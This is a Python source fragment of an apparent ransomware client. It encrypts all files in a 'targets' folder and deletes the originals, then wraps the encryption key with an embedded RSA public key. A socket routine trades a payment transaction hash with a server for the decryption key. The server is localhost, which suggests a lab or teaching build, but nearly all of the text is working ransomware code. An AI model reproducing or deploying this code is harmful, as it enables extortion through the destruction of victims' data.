def raise_above_all(win):
    win.attributes('-topmost', 1)
    win.attributes('-topmost', 0)


def decrypt_all_files(sym_key):
    for filename in glob.glob("targets/*"):
        if path.isfile(filename):
            with open(filename, 'rb') as file1:
                token = sym_key.decrypt(file1.read())
                new_filename = f"{os.path.splitext(filename)[0].replace('[encrypted]', '')}" \
                               f"[decrypted]{os.path.splitext(filename)[1]}"
            with open(new_filename, "wb") as file3:
                file3.write(token)


def is_files_encrypted():
    for filename in glob.glob("targets/*"):
        if "[encrypted]" in filename:
            return True


class RansomwareClient:

    def __init__(self):
        self.target_host = '127.0.0.1'
        self.target_port = 8000
        self.key = Fernet.generate_key()
        self.f = Fernet(self.key)
        self.except_list = []
        self.public_key = ""
        self.ciphertext = ""

    def encrypt_all_files(self):

        for filename in glob.glob("targets/*"):
            if filename not in self.except_list:
                with open(filename, 'rb') as file1:
                    token = self.f.encrypt(file1.read())
                    new_filename = f"{os.path.splitext(filename)[0]}[encrypted]{os.path.splitext(filename)[1]}"
                    self.except_list.append(new_filename)
                with open(new_filename, "wb") as file2:
                    file2.write(token)
                os.remove(filename)

    def encrypt_symmetric(self):

        self.public_key = serialization.load_pem_public_key(PKEY)

        # Encrypt the symmetric key
        self.ciphertext = self.public_key.encrypt(
            self.key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )

        )
        # Write the encrypted symmetric key to a file
        with open("enc_symmetric.key", "wb") as file4:
            file4.write(self.ciphertext)

        # Read the encrypted symmetric key
        with open('enc_symmetric.key', 'rb') as file:
            self.ciphertext = file.read()

    def connect_to_server(self):

        with open('enc_symmetric.key', 'rb') as file:
            self.ciphertext = file.read()

        transaction_hash = transaction_id_input.get().strip().encode('utf-8')
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # connect to the client
        client.connect((Ransomware.target_host, Ransomware.target_port))
        client.send(self.ciphertext)
        # Send the transaction hash
        client.send(transaction_hash)
        # receive the decrypted symmetric key
        response = client.recv(4096)
        if response.strip().decode('utf-8') != "ERROR":
            # decrypt the encrypted files using the symmetric key sent by the server
            f2 = Fernet(response)
            decrypt_all_files(f2)

            alert_label.config(text="")
            info_label.config(text="")
            animated.config(text="ALL FILES WERE DECRYPTED SUCCESSFULLY!", fg="#008000")
            client.close()
        else:
            animated.config(text="TRANSACTION CANNOT BE FOUND!")
            client.close()

    def destroy_symmetric_key(self):
        # Destroy the symmetric key from the memory
        del self.key
        gc.collect()


